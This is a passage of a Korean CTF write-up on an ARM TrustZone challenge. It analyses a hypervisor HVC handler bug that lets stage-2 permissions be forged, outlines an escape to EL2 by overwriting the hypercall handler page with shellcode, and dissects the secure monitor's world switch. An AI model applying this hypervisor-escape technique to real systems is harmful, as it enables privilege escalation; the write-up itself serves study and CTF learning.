실제로 2번은 EL2에서 RWX가 아니라 RW로 봐야한다.<br>
임의 쉘코드 실행을 만들었으니 이제 EL2를 보면 된다.</p>
<h2 id="el2-virtual-machine-monitor">EL2, Virtual machine monitor<a hidden class="anchor" aria-hidden="true" href="#el2-virtual-machine-monitor">#</a></h2>
<p>커널까지 공격했으니 이제 hypervisor를 공격해서 vm escape를 해서 Normal world를 모두 컨트롤할 수 있도록 만들어야한다.<br>
원래 EL1에서 EL3로 secure monitor call을 하는것도 EL2를 거쳐서 처리되기 때문에 여기를 공격 타겟으로 잡아야한다.<br>
이 문제에선 Type 1 hypervisor를 채택한 구조다.<br>
만약 Type 2 구조였다면 공격 벡터를 추가적으로 저 highvisor 부분으로도 신경을 썼어야 하지 않았을까 생각한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (EC_ <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>b00010110) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      x1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">HVC_handler</span>(x1,saved_reg[<span style="color:#ae81ff">2</span>],saved_reg[<span style="color:#ae81ff">2</span>],saved_reg[<span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      x0 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (EC_ <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>b00010111) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000003</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3c001</span>) {
</span></span><span style="display:flex;"><span>        x0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SMC_handler</span>(<span style="color:#ae81ff">0x83000003</span>,x1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40000000</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        x0 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      x0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SMC_handler</span>(x0,x1);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>이전에 spS-EL = 0으로 해주고 위 함수로 점프한다.<br>
EL1에서 smc를 통해 secure monitor를 call 할 수 있던 이유는 여기서 저런식으로 따로 핸들링을 다시 해줬기 때문이였다.<br>
EL1에서 mmap, mprotect 핸들링시에 hypercall로 EL2를 부르는데 EL2는 여기서 EL2 page table을 변경한다.</p>
<h3 id="vulnerability-2">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-2">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3c000</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* x1 &lt; 0xc000 and must not be writable */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xc000</span>) <span style="color:#f92672">&amp;&amp;</span> (((uint)x2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_4010009c</span>(s__[VMM]_try_to_map_writable_pages_40102130);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_401006a8</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_40100774</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* (el0/el1 exec) and (no write) */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((x2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x40000000000080</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x80</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* ??? */</span>
</span></span><span style="display:flex;"><span>        puVar1 <span style="color:#f92672">=</span> (undefined <span style="color:#f92672">*</span>)(x1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40000000</span> <span style="color:#f92672">|</span> x2);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">**</span>)(<span style="color:#f92672">&amp;</span>DAT_40107000 <span style="color:#f92672">+</span> (idx_addr <span style="color:#f92672">+</span> (x1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">21</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>HVC handler를 분석하다가 얼마 안돼서 뭔가 이상함을 발견했다.<br>
애초에 쓰는게 descriptor인데 IPA가 PA에 저렇게 영향을 주면 안된다는 것을 깨달았다.<br>
그리고 이 취약점을 이용하면 0x3c000보다 작은 임의 IPA에 대해 할당하고 PA를 매핑할 때 S2AP는 하위 1바이트안에 들어가니 이를 이용해 RWX 페이지를 매핑할 수 있다는 것을 알았다.<br>
근데 IPA는 EL1에서 임의 코드 실행을 달성한 순간부터 원하는 VA와 매핑할 수 있다.</p>
<p>하이퍼바이저쪽 페이지 권한이 컨트롤 가능하다면, 사실상 IPA는 이미 컨트롤가능하니 이걸로 이전과 똑같이 공격을 하면 된다.</p>
<p>마저 익스플로잇 전략을 설명하자면 hypercall handler가 위치한 페이지를 바꿔치기해서 다음과 같이 해준다.</p>
<ol>
<li>EL1에서 EL0쪽 PTE를 변조해서 특정 IPA를 가리키도록 하고 AP 01로 설정한다.</li>
<li>hvc로 변조한 특정 IPA를 hypervisor의 handler 코드 페이지를 가리키는 PA로 세팅하고 S2AP 11로 설정한다.</li>
<li>EL2 shellcode를 EL2 0x40102000에 복사한다.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span>hitcon{this is flag <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">for</span> EL2}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>x00[<span style="color:#f92672">*</span>] Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span></code></pre></div><p>gef arm64 pagewalk는 권한을 틀리게 보여줘서 직접 손으로 pagewalk해서 확인해야한다.<br>
pull request 보내려 했는데 나중에 보내야겠다.</p>
<h2 id="exploring-the-secure-world">Exploring the Secure world<a hidden class="anchor" aria-hidden="true" href="#exploring-the-secure-world">#</a></h2>
<p>Normal world의 최고 exception level까진 도달했다.<br>
non-secure physical memory의 모든 부분이 제어 가능하다.<br>
이제 secure world로 넘어가야한다.</p>
<p>전에 arm trustzone 관련해서 메뉴얼을 정리하면서 어떻게 trustzone이 메모리 격리를 유지하는지에 대해서 공부했었다.<br>
리마인드하자면 ARM CPU는 NS 비트를 하드웨어적으로 지원해서 메모리 격리를 유지하고 캐시 라인에서도 NS를 추가하면 따로 tlb flush도 안해도 되는식으로 구현을 했다.<br>
ARM CPU는 SMMU를 통해 Non-secure world에서의 장치 액세스를 막아서 실질적으로 Secure world도 점거해야 중요한 장치를 공격할 수 있다.</p>
<h3 id="analyzing-the-secure-monitor">Analyzing the secure monitor<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-secure-monitor">#</a></h3>
<p>qemu에서 32bit 디버깅을 지원하지 않는다.<br>
그래서 직접 빌드하고 run script를 수정했다.<br>
기존에 직접 작성했던 secure memory를 읽는 기능을 이용해야해서 로컬에서 디버깅을 시작했다.<br>
부팅 과정에서 가장 높은 exception level로 부팅을 시도하기에 전에 분석했었던 S-EL3의 부트로더부분으로 돌아가야한다.<br>
거기서 VBAR_EL3가 0x2000인 것을 얻을 수 있다.<br>
일단 EL2에서 S-EL3를 바로 공격하는게 가능한지 확인해봤다.</p>
<p>EL3의 bootloader에서 미리 0xe000000 쪽의 메모리를 0으로 밀었었다.<br>
FUN_00000ad0는 다음과 같이 기존 non-secure system register를 특정 secure memory의 주소 + 0x130에 저장한다.<br>
이는 아마 gerneral purpose register까지 저장하기에 그런 것 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>dfc <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x16 ,actlr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e00</span> <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">01</span>  a9    stp        x15 ,x16 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x10</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e04</span> <span style="color:#ae81ff">51</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x17 ,cpacr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e08</span> <span style="color:#ae81ff">09</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">3</span>a  d5    mrs        x9,csS<span style="color:#f92672">-</span>ELr_el1
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e6</span>c <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">0</span>a  a9    stp        x17 ,x9,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xa0</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e70</span> <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">9</span>c  <span style="color:#ae81ff">3</span>b  d5    mrs        x10 ,pmcr_el0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e74</span> <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">58</span>  <span style="color:#ae81ff">00</span>  f9    str        x10 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xb0</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e78</span> c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>아마 S-EL2는 구현되지 않아서 최대 S-EL1까지의 레지스터만 저장하는 것으로 보인다.</p>
<p>전에 trustzone 구현 메뉴얼을 살펴봤다.<br>
그때 SCR_EL3.NS를 반전시켜 non-secure과 secure 전환을 한다고 했었는데, 그전에 이렇게 system register의 save/load가 필요하다고 나와있었는데 그 부분이 구현된 부분이다.<br>
그렇다면 이런 save 함수가 있으니 이는 secure world 진입 직전일 것이고, 당연히 stack context 복구나 saved system registers를 다시 restore하는 함수도 있을 것임을 알 수 있다.<br>
이런 구조를 염두에 두고 분석했더니니 쉽게 분석할 수 있었다.</p>
<p>x0 == 0x83000001는 secure → normal 이다.<br>
그 위 부분들은 secure world에서 호출시에만 동작하니 일단 생략한다.<br>
위 함수가 호출되기 전에 조금 흥미로운 작업을 수행한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>                             sp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe002210</span> 
</span></span><span style="display:flex;"><span>                             fill out general purpose regs
</span></span><span style="display:flex;"><span>                             LAB_0000280c                                    XREF[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">0000241</span><span style="color:#ae81ff">8</span> (j) , <span style="color:#ae81ff">0000261</span><span style="color:#ae81ff">8</span> (j)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">80</span>c c0  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000f0c                                     undefined <span style="color:#a6e22e">FUN_00000f0c</span>(undefined
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">810</span> e5  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">1f</span>  aa    mov        param_6 ,xzr
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">814</span> e6  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        param_7 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">818</span> cc  <span style="color:#ae81ff">88</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x12 ,[param_7 , <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x110</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">81</span>c bf  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">820</span> <span style="color:#ae81ff">9f</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        sp,x12
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">824</span> <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x16 ,spsr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">828</span> <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x17 ,elr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">82</span>c <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x18 ,scr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">830</span> d0  c4  <span style="color:#ae81ff">11</span>  a9    stp        x16 ,x17 ,[param_7 , <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x118</span> ]
</span></span><span style="display:flex;"><span>		...
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">--</span> Flow Override: <span style="color:#a6e22e">CALL_RETURN</span> (CALL_TERMINATOR)
</span></span></code></pre></div><p>디컴파일러에선 아예 보이지 않는데, 여기서 normal world context가 저장된 sp를 param_7(w6)에 넣고 spsr_el3, elr_el3, scr_el3를 저장한다.<br>
PState.SP에 0을 넣고 s-el3의 특정 stack 주소를 세팅해서 동작을 이어간다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bb4 fd  <span style="color:#ae81ff">7</span>b  bf  a9    stp        x29 ,x30 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>local_10 ]<span style="color:#f92672">!</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bb8 fd  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        x29 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bbc <span style="color:#ae81ff">38</span>  ff  ff  <span style="color:#ae81ff">97</span>    bl         get_secure_mem                                   world_ctx <span style="color:#f92672">*</span> <span style="color:#a6e22e">get_secure_mem</span>(uint6
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bc0 bf  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bc4 <span style="color:#ae81ff">1f</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        sp,x0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bc8 bf  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bcc fd  <span style="color:#ae81ff">7</span>b  c1  a8    ldp        x29 ,x30 ,[sp], <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bd0 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>여기서 sp_elxh를 세팅한다.<br>
아까 normal world context가 sp_elxh가 가리키는 구조체였고 이전에 normal world context에 접근하나, secure world context에 접근하냐에 따라 S-EL3에 진입할 때 어떤 world context에 저장할지 결정된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>a8 f1  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        x17 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>ac bf  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>b0 f1  <span style="color:#ae81ff">8</span>b  <span style="color:#ae81ff">00</span>  f9    str        x17 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_11 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>b4 f2  <span style="color:#ae81ff">83</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x18 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>SCR_EL3 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>b8 f0  c7  <span style="color:#ae81ff">51</span>  a9    ldp        x16 ,x17 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>SPSR_EL3 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>bc <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">1</span>e  d5    msr        scr_el3 ,x18
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>c0 <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">1</span>e  d5    msr        spsr_el3 ,x16
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>c4 <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">1</span>e  d5    msr        elr_el3 ,x17
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>c8 f5  ff  ff  <span style="color:#ae81ff">17</span>    b          FUN_00000f9c                                     undefined <span style="color:#a6e22e">FUN_00000f9c</span>(undefined
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">--</span> Flow Override: <span style="color:#a6e22e">CALL_RETURN</span> (CALL_TERMINATOR)
</span></span></code></pre></div><p>그리고 마지막으로 여기서 world switch를 수행한다.<br>
FUN_00000f9c에선 general purpose register 불러오고 eret을 수행한다.</p>
<p>아무리 봐도 악용할만한 취약점이 보이지 않았다.<br>
그래서 S-EL0 부터 공격하기로 결정했다.</p>
<h3 id="analyzing-the-interaction-between-the-normal-world-and-the-secure-world">Analyzing the Interaction Between the Normal World and the Secure World<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-interaction-between-the-normal-world-and-the-secure-world">#</a></h3>
<h4 id="el0">EL0<a hidden class="anchor" aria-hidden="true" href="#el0">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_init_trustlet</span>(iVar1,size);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    pTVar3 <span style="color:#f92672">=</span> (TCI <span style="color:#f92672">*</span>)<span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">tc_register_wsm</span>(pTVar3,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>  ...
</span></span></code></pre></div><p>위와 같은 방식으로 초기화를 했었고 TA_bin이라는 이상한 바이너리를 넘겼었다.</p>
<h4 id="el1">EL1<a hidden class="anchor" aria-hidden="true" href="#el1">#</a></h4>
<p>따로 처리 로직이 존재한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xff000005</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((x0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">secure_monitor_call</span>(<span style="color:#ae81ff">0x83000005</span>,x0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>,x1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (x8 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xff000006</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((x0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">secure_monitor_call</span>(<span style="color:#ae81ff">0x83000006</span>,x0,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
</span></span></code></pre></div><p>실질적으로 약간의 넘겨진 메모리 주소 검사를 해주고 모두 secure monitor로 넘긴다.</p>
<h4 id="el2">EL2<a hidden class="anchor" aria-hidden="true" href="#el2">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3c001</span>) {
</span></span><span style="display:flex;"><span>        x0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SMC_handler</span>(<span style="color:#ae81ff">0x83000003</span>,x1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40000000</span>);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      x0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SMC_handler</span>(x0,x1);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>IPA → PA를 해주고 Secure monitor로 마저 넘긴다.</p>
<h4 id="s-el3">S-EL3<a hidden class="anchor" aria-hidden="true" href="#s-el3">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((non_secure <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x83000002</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000007</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">save_el1_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        pwVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_secure_mem</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        pwVar2<span style="color:#f92672">-&gt;</span>x0 <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> pwVar2;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_00000d28</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">do_panic</span>();
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* save non-secure system register */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">save_el1_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000001</span>) {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000b2c</span>(<span style="color:#ae81ff">0</span>,tmp.PC <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x1d3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>이제 호출되었을 때 어디로 가는지 확인해야할 필요가 있다.</p>
<h4 id="spsr_el3-structure--gdbscript">SPSR_EL3 structure &amp; gdbscript<a hidden class="anchor" aria-hidden="true" href="#spsr_el3-structure--gdbscript">#</a></h4>
<p>AArch64 exception이 발생했을 때 M bit 인코딩과 arm32에 대한 M bit 인코딩을 메뉴얼에서 확인했고 명령어 지원을 추가했다.<br>
